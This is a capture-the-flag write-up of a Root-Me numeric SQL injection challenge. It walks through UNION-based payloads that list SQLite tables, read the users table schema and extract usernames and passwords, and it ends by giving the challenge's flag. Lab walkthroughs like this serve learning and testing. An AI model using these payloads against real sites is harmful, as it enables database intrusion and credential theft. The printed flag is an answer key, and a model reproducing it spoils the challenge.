**After starting the challenge we can see a bunch of features in site in home we have some published one liner notices and inside that some words on home page and also a login page..**

<br>

**In parameter news_id when I didn't passed any id it gave err so I am sure that sql injection is possible and it has also leaked which sql is being used as SQLite3 while giving error message in web..**

**Now lets understand what's SQL injection - Numeric is: Numeric SQL injection is an attack where an attacker manipulates number-based input fields (like IDs or quantities) to alter an SQL query and gain unauthorized access or control over a database. Because the backend query is almost certainly like this:**

```
SELECT title, content, date FROM news WHERE id = 2
```

**news_id is used as an integer, not as a string.**
<br><br>
**So when you inject payload: `2 union select 1,tbl_name,3 from sqlite_master` it becomes:**

```
SELECT title, content, date FROM news WHERE id = 2
union select 1,tbl_name,3 from sqlite_master              // SQLite‑specific syntax extracts table names from the database schema
```

**After visiting `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2%20union%20select%201,tbl_name,3%20from%20sqlite_master` we can see db's names: **

<br>
<br>

**So now we know that users table exists now we need to know the fields or columns inside it to fetch that columns..**
<br><br>
**I tryed using `UNION SELECT 1, sql, 3 FROM sqlite_master WHERE tbl_name='users'` but in `tbl_name='users'` the quote `''` there messed up with syntax shown earlier and thought to dump CREATE TABLE progressively so no WHERE quotes no probles and I used:**

```
2 UNION SELECT 1,substr(sql,1,200),3 FROM sqlite_master     // It looks for the line containing CREATE TABLE <tablename> ( <its_columns_data> )..
```

**After we visit site `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2%20union%20select%201,substr(sql,1,200),3%20from%20sqlite_master` we can see we got the results we wanted:**

<br>
<br>

**Now we will fetch username and password column form users table using `union select 1,username,password from users` So, our final payload becomes:**

```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2 union select 1,username,password from users
```

<br>
<br>

**And hell yeah we got the flag and we will use this "aTlkJYLjcbLmue3" as flag/passwd to validate the challenge..** <br><br>
**Thankyou.**
